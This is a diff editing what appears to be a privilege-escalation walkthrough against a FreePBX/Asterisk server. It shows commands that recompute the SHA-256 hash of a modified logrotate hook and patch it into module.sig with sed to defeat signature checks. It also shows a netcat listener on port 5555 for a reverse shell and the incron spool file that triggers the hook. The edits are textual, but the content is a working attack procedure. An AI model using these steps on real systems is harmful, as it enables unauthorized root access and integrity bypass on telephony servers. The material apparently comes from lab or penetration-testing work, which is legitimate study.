@@ -124,10 +124,12 @@ Fortunately for us, we've got write permissions for this file:
 	-rw-rw-r--. 1 asterisk asterisk 249099 Nov  2  2023 /var/www/html/admin/modules/ucp/module.sig
 
 
-Modify logrotate hash in module.sig:
+Evaluate the new hash:
 
 	$ hash=$(sha256sum /var/www/html/admin/modules/ucp/hooks/logrotate | awk '{print $1}'); echo $hash
 	b420c8f2d0ed535cc60521b2e16ea45dc963c45a3c62bc190f7ababae6f509ba
+
+Modify logrotate hash in module.sig:
 
 	$ sed -i "s|hooks/logrotate = .*|hooks/logrotate = $hash|" /var/www/html/admin/modules/ucp/module.sig
 
@@ -143,7 +145,7 @@ Setup listener on your machine:
 	$ nc -nvlp 5555
 
 
-Now we can trigger the logrotate hook, which will con:
+Now we can trigger the logrotate hook, which will initiate connection:
 
 	$ touch /var/spool/asterisk/incron/ucp.logrotate
 
